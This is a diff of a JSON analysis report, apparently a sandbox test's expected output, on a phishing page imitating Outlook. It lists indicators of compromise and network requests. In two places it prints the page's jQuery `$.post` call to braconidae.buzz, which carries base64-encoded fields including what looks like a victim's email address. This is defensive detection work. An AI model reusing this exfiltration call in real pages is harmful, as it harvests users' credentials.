@@ -114,7 +114,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript sends a network request via jQuery\n\t\t$.post(https://braconidae.buzz/bucket/1ec247a.php,scte=YWJvbmFuaUAya2V5cy5jYQ==&data11=Nw==&data22=Q...",
+        "body": "JavaScript sends a network request via jQuery\n\t\t$.post(https://braconidae.buzz/bucket/1ec247a.php,scte=YWJvbmFuaUAya2V5cy5jYQ==&data11=OQ==&data22=I...",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -182,7 +182,200 @@
       },
       {
         "auto_collapse": false,
-        "body": "[{\"ioc_type\": \"domain\", \"ioc\": \"braconidae.buzz\"}, {\"ioc_type\": \"domain\", \"ioc\": \"cdnjs.cloudflare.com\"}, {\"ioc_type\": \"domain\", \"ioc\": \"outlook-1.cdn.office.net\"}, {\"ioc_type\": \"ip\", \"ioc\": \"65.247.23.55\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://braconidae.buzz/bucket/1ec247a.php\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://code.jquery.com/jquery-3.1.1.min.js\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://outlook-1.cdn.office.net/assets/mail/fonts/v1/fonts/segoeui-light.eot?#iefix\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://outlook-1.cdn.office.net/assets/mail/fonts/v1/fonts/segoeui-light.ttf\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://outlook-1.cdn.office.net/assets/mail/fonts/v1/fonts/segoeui-light.woff\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://outlook-1.cdn.office.net/assets/mail/fonts/v1/fonts/segoeui-regular.eot?#iefix\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://outlook-1.cdn.office.net/assets/mail/fonts/v1/fonts/segoeui-regular.ttf\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://outlook-1.cdn.office.net/assets/mail/fonts/v1/fonts/segoeui-regular.woff\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://outlook-1.cdn.office.net/assets/mail/fonts/v1/fonts/segoeui-semibold.eot?#iefix\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://outlook-1.cdn.office.net/assets/mail/fonts/v1/fonts/segoeui-semibold.ttf\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://outlook-1.cdn.office.net/assets/mail/fonts/v1/fonts/segoeui-semibold.woff\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://outlook-1.cdn.office.net/assets/mail/fonts/v1/fonts/segoeui-semilight.eot?#iefix\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://outlook-1.cdn.office.net/assets/mail/fonts/v1/fonts/segoeui-semilight.ttf\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://outlook-1.cdn.office.net/assets/mail/fonts/v1/fonts/segoeui-semilight.woff\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://outlook-1.cdn.office.net/owamail/20220325002.04/resources/fonts/o365icons-mdl2.ttf\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://outlook-1.cdn.office.net/owamail/20220325002.04/resources/fonts/o365icons-mdl2.woff\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://outlook-1.cdn.office.net/owamail/20220325002.04/resources/fonts/office365icons.eot?\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://outlook-1.cdn.office.net/owamail/20220325002.04/resources/fonts/office365icons.eot?#iefix\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://outlook-1.cdn.office.net/owamail/20220325002.04/resources/fonts/office365icons.svg?#office365icons\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://outlook-1.cdn.office.net/owamail/20220325002.04/resources/fonts/office365icons.ttf?\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://outlook-1.cdn.office.net/owamail/20220325002.04/resources/fonts/office365icons.woff?\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/ajax/libs/crypto-js/4.1.1/crypto-js.min.js\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/assets/mail/fonts/v1/fonts/segoeui-light.eot?#iefix\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/assets/mail/fonts/v1/fonts/segoeui-light.ttf\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/assets/mail/fonts/v1/fonts/segoeui-light.woff\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/assets/mail/fonts/v1/fonts/segoeui-regular.eot?#iefix\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/assets/mail/fonts/v1/fonts/segoeui-regular.ttf\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/assets/mail/fonts/v1/fonts/segoeui-regular.woff\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/assets/mail/fonts/v1/fonts/segoeui-semibold.eot?#iefix\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/assets/mail/fonts/v1/fonts/segoeui-semibold.ttf\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/assets/mail/fonts/v1/fonts/segoeui-semibold.woff\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/assets/mail/fonts/v1/fonts/segoeui-semilight.eot?#iefix\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/assets/mail/fonts/v1/fonts/segoeui-semilight.ttf\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/assets/mail/fonts/v1/fonts/segoeui-semilight.woff\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/bucket/1ec247a.php\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/jquery-3.1.1.min.js\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/owamail/20220325002.04/resources/fonts/o365icons-mdl2.ttf\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/owamail/20220325002.04/resources/fonts/o365icons-mdl2.woff\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/owamail/20220325002.04/resources/fonts/office365icons.eot?\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/owamail/20220325002.04/resources/fonts/office365icons.eot?#iefix\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/owamail/20220325002.04/resources/fonts/office365icons.svg?#office365icons\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/owamail/20220325002.04/resources/fonts/office365icons.ttf?\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/owamail/20220325002.04/resources/fonts/office365icons.woff?\"}]",
+        "body": [
+          {
+            "ioc": "braconidae.buzz",
+            "ioc_type": "domain"
+          },
+          {
+            "ioc": "cdnjs.cloudflare.com",
+            "ioc_type": "domain"
+          },
+          {
+            "ioc": "outlook-1.cdn.office.net",
+            "ioc_type": "domain"
+          },
+          {
+            "ioc": "65.247.23.55",
+            "ioc_type": "ip"
+          },
+          {
+            "ioc": "https://braconidae.buzz/bucket/1ec247a.php",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "https://code.jquery.com/jquery-3.1.1.min.js",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "https://outlook-1.cdn.office.net/assets/mail/fonts/v1/fonts/segoeui-light.eot?#iefix",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "https://outlook-1.cdn.office.net/assets/mail/fonts/v1/fonts/segoeui-light.ttf",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "https://outlook-1.cdn.office.net/assets/mail/fonts/v1/fonts/segoeui-light.woff",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "https://outlook-1.cdn.office.net/assets/mail/fonts/v1/fonts/segoeui-regular.eot?#iefix",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "https://outlook-1.cdn.office.net/assets/mail/fonts/v1/fonts/segoeui-regular.ttf",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "https://outlook-1.cdn.office.net/assets/mail/fonts/v1/fonts/segoeui-regular.woff",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "https://outlook-1.cdn.office.net/assets/mail/fonts/v1/fonts/segoeui-semibold.eot?#iefix",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "https://outlook-1.cdn.office.net/assets/mail/fonts/v1/fonts/segoeui-semibold.ttf",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "https://outlook-1.cdn.office.net/assets/mail/fonts/v1/fonts/segoeui-semibold.woff",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "https://outlook-1.cdn.office.net/assets/mail/fonts/v1/fonts/segoeui-semilight.eot?#iefix",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "https://outlook-1.cdn.office.net/assets/mail/fonts/v1/fonts/segoeui-semilight.ttf",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "https://outlook-1.cdn.office.net/assets/mail/fonts/v1/fonts/segoeui-semilight.woff",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "https://outlook-1.cdn.office.net/owamail/20220325002.04/resources/fonts/o365icons-mdl2.ttf",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "https://outlook-1.cdn.office.net/owamail/20220325002.04/resources/fonts/o365icons-mdl2.woff",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "https://outlook-1.cdn.office.net/owamail/20220325002.04/resources/fonts/office365icons.eot?",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "https://outlook-1.cdn.office.net/owamail/20220325002.04/resources/fonts/office365icons.eot?#iefix",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "https://outlook-1.cdn.office.net/owamail/20220325002.04/resources/fonts/office365icons.svg?#office365icons",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "https://outlook-1.cdn.office.net/owamail/20220325002.04/resources/fonts/office365icons.ttf?",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "https://outlook-1.cdn.office.net/owamail/20220325002.04/resources/fonts/office365icons.woff?",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "/ajax/libs/crypto-js/4.1.1/crypto-js.min.js",
+            "ioc_type": "uri_path"
+          },
+          {
+            "ioc": "/assets/mail/fonts/v1/fonts/segoeui-light.eot?#iefix",
+            "ioc_type": "uri_path"
+          },
+          {
+            "ioc": "/assets/mail/fonts/v1/fonts/segoeui-light.ttf",
+            "ioc_type": "uri_path"
+          },
+          {
+            "ioc": "/assets/mail/fonts/v1/fonts/segoeui-light.woff",
+            "ioc_type": "uri_path"
+          },
+          {
+            "ioc": "/assets/mail/fonts/v1/fonts/segoeui-regular.eot?#iefix",
+            "ioc_type": "uri_path"
+          },
+          {
+            "ioc": "/assets/mail/fonts/v1/fonts/segoeui-regular.ttf",
+            "ioc_type": "uri_path"
+          },
+          {
+            "ioc": "/assets/mail/fonts/v1/fonts/segoeui-regular.woff",
+            "ioc_type": "uri_path"
+          },
+          {
+            "ioc": "/assets/mail/fonts/v1/fonts/segoeui-semibold.eot?#iefix",
+            "ioc_type": "uri_path"
+          },
+          {
+            "ioc": "/assets/mail/fonts/v1/fonts/segoeui-semibold.ttf",
+            "ioc_type": "uri_path"
+          },
+          {
+            "ioc": "/assets/mail/fonts/v1/fonts/segoeui-semibold.woff",
+            "ioc_type": "uri_path"
+          },
+          {
+            "ioc": "/assets/mail/fonts/v1/fonts/segoeui-semilight.eot?#iefix",
+            "ioc_type": "uri_path"
+          },
+          {
+            "ioc": "/assets/mail/fonts/v1/fonts/segoeui-semilight.ttf",
+            "ioc_type": "uri_path"
+          },
+          {
+            "ioc": "/assets/mail/fonts/v1/fonts/segoeui-semilight.woff",
+            "ioc_type": "uri_path"
+          },
+          {
+            "ioc": "/bucket/1ec247a.php",
+            "ioc_type": "uri_path"
+          },
+          {
+            "ioc": "/jquery-3.1.1.min.js",
+            "ioc_type": "uri_path"
+          },
+          {
+            "ioc": "/owamail/20220325002.04/resources/fonts/o365icons-mdl2.ttf",
+            "ioc_type": "uri_path"
+          },
+          {
+            "ioc": "/owamail/20220325002.04/resources/fonts/o365icons-mdl2.woff",
+            "ioc_type": "uri_path"
+          },
+          {
+            "ioc": "/owamail/20220325002.04/resources/fonts/office365icons.eot?",
+            "ioc_type": "uri_path"
+          },
+          {
+            "ioc": "/owamail/20220325002.04/resources/fonts/office365icons.eot?#iefix",
+            "ioc_type": "uri_path"
+          },
+          {
+            "ioc": "/owamail/20220325002.04/resources/fonts/office365icons.svg?#office365icons",
+            "ioc_type": "uri_path"
+          },
+          {
+            "ioc": "/owamail/20220325002.04/resources/fonts/office365icons.ttf?",
+            "ioc_type": "uri_path"
+          },
+          {
+            "ioc": "/owamail/20220325002.04/resources/fonts/office365icons.woff?",
+            "ioc_type": "uri_path"
+          }
+        ],
         "body_config": {
           "column_order": [
             "ioc_type",
@@ -268,7 +461,14 @@
       },
       {
         "auto_collapse": false,
-        "body": "[{\"url\": \"https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js\"}, {\"url\": \"https://code.jquery.com/jquery-3.1.1.min.js\"}]",
+        "body": [
+          {
+            "url": "https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"
+          },
+          {
+            "url": "https://code.jquery.com/jquery-3.1.1.min.js"
+          }
+        ],
         "body_config": {
           "column_order": [
             "url"
@@ -314,7 +514,21 @@
       },
       {
         "auto_collapse": false,
-        "body": "[{\"url\": \"https://code.jquery.com/jquery-3.1.1.min.js\", \"method\": \"get\"}, {\"url\": \"https://braconidae.buzz/bucket/1ec247a.php\", \"method\": \"post\", \"request_body\": \"scte=YWJvbmFuaUAya2V5cy5jYQ==&data11=Nw==&data22=Q3NTcy&data33=MTY5Nz\"}, {\"url\": \"https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js\", \"method\": \"get\"}]",
+        "body": [
+          {
+            "method": "get",
+            "url": "https://code.jquery.com/jquery-3.1.1.min.js"
+          },
+          {
+            "method": "post",
+            "request_body": "scte=YWJvbmFuaUAya2V5cy5jYQ==&data11=OQ==&data22=IyODY0&data33=MTcwMD",
+            "url": "https://braconidae.buzz/bucket/1ec247a.php"
+          },
+          {
+            "method": "get",
+            "url": "https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"
+          }
+        ],
         "body_config": {
           "column_order": [
             "url",
